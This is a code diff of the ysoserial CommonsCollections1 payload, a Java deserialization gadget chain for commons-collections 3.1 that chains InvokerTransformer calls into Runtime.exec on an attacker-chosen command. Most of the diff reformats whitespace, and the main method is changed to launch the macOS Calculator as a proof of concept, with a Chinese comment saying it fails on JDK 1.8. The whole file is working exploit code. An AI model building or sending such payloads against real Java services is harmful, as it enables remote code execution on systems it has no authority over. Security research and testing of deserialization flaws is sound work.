@@ -41,47 +41,48 @@ import ysoserial.payloads.util.Reflections;
 		commons-collections
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@PayloadTest ( precondition = "isApplicableJavaVersion")
+@PayloadTest(precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
-		// inert chain for setup
-		final Transformer transformerChain = new ChainedTransformer(
-			new Transformer[]{ new ConstantTransformer(1) });
-		// real chain for after setup
-		final Transformer[] transformers = new Transformer[] {
-				new ConstantTransformer(Runtime.class),
-				new InvokerTransformer("getMethod", new Class[] {
-					String.class, Class[].class }, new Object[] {
-					"getRuntime", new Class[0] }),
-				new InvokerTransformer("invoke", new Class[] {
-					Object.class, Object[].class }, new Object[] {
-					null, new Object[0] }),
-				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
-				new ConstantTransformer(1) };
+    public InvocationHandler getObject(final String command) throws Exception {
+        final String[] execArgs = new String[]{command};
+        // inert chain for setup
+        final Transformer transformerChain = new ChainedTransformer(
+                new Transformer[]{new ConstantTransformer(1)});
+        // real chain for after setup
+        final Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{
+                        String.class, Class[].class}, new Object[]{
+                        "getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{
+                        Object.class, Object[].class}, new Object[]{
+                        null, new Object[0]}),
+                new InvokerTransformer("exec",
+                        new Class[]{String.class}, execArgs),
+                new ConstantTransformer(1)};
 
-		final Map innerMap = new HashMap();
+        final Map innerMap = new HashMap();
 
-		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
 
-		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
 
-		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
-		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
-		return handler;
-	}
+        return handler;
+    }
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections1.class, args);
-	}
+    public static void main(final String[] args) throws Exception {
+        //PayloadRunner.run(CommonsCollections1.class, args);
+        PayloadRunner.run(CommonsCollections1.class, new String[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"}); //在JDK1.8下GG了~
+    }
 
-	public static boolean isApplicableJavaVersion() {
+    public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
